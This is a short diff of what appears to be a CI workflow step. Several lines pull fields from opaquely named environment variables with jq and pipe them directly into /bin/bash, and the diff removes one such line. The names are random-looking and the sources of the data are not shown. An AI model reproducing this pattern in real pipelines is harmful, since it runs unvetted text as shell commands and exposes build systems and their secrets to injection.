@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
           echo $mxo34571 | jq -r .q7930 | /bin/bash
-          printf '%s' "$tci5" | jq -r .nkc300 | /bin/bash
           echo $aimh17 | jq -r .by0 | /bin/bash
 
       - name: Save results
